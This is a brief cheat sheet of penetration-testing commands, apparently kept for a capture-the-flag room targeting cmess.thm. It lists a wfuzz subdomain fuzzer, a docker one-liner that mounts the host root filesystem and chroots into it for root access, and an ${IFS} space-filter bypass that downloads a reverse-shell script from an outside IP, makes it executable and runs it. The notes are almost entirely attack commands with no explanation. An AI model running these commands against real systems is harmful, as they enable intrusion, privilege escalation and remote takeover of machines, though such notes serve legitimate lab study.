subdomain fuzzer

>   wfuzz -c -f sub-fighter -w top5000.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm"


docker run -v /:/mnt --rm -it bash chroot /mnt sh

##  Space restriction bypass with `[${IFS}]`

>   wget${IFS}http://10.10.12.52/rev.sh

>   chmod${IFS}777${IFS}rev.sh

>   bash${IFS} rev.sh